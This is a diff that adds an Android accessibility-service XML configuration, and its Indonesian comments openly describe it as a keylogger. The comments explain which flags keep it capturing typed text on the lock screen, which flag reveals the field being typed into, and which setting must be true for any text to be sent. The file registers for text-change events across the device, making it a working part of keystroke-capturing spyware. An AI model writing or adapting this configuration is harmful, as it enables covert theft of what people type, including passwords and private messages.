@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+  Konfigurasi AccessibilityService buat keylog.
+
+  Flag yang dipakai:
+    flagRetrieveInteractiveWindows  - tetap menerima event saat layar kunci
+    flagReportViewIds               - event membawa viewId, jadi jelas kolom
+                                      mana yang diketik
+  canRetrieveWindowContent wajib true; tanpa itu tidak ada teks yang dikirim.
+  Kalau nilainya false, service aktif tapi tidak pernah mencatat apa pun —
+  kegagalan yang tidak kelihatan.
+-->
+<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+    android:accessibilityEventTypes="typeViewTextChanged"
+    android:accessibilityFeedbackType="feedbackGeneric"
+    android:accessibilityFlags="flagRetrieveInteractiveWindows|flagReportViewIds"
+    android:canRetrieveWindowContent="true"
+    android:description="@string/keylog_desc"
+    android:notificationTimeout="200" />
